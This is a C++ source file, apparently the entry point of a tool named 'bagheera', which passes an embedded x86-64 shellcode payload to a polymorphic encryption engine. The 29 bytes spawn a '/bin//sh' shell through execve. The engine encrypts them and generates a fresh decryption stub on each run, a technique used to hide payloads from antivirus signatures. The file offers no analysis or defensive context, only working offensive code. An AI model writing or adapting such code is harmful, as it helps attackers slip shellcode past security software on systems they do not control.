#include "src/bagheera.hpp"
#include "src/includes.hpp"




int main()
{

  //srand(1);
  srand(time(NULL));

  // input data (in this case a simple string,
  // although it could be any data buffer)
  //std::cout << "Creating payload\n";

  //uint8_t payload[] = "Python es solo C pero mas lento y si definir los tipos";
  
  uint8_t payload[29] = {
    0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05
  };
  

  //std::ifstream ifs("hello_world");
  //std::string payload( (std::istreambuf_iterator<char>(ifs) ),
                       //(std::istreambuf_iterator<char>()    ) );
  //std::cout << payload.data() << std::endl;

  // create an instance of the polymorphic
  // engine,
  //std::cout << "Creating bangheera PE instance\n";

  CMutagenSPE *speEngine = new CMutagenSPE();

  // a pointer to the generated decryption
  // function will be placed here
  //std::cout << "Creating pointer to the generated decryption function\n";
  unsigned char *lpcDecryptionProc = NULL;

  // the size of the decryption code (and
  // its encrypted payload) will go here
  //std::cout << "Defining size of the decryption code\n";
  unsigned long dwDecryptionProcSize = 0;

  // encrypt the input data and dynamically
  // generate a decryption function
  //std::cout << "Call PolySPE function and encrypt data\n";
  speEngine->PolySPE((unsigned char*)payload, sizeof(payload), &lpcDecryptionProc, &dwDecryptionProcSize);

 
  return 0;
  
}


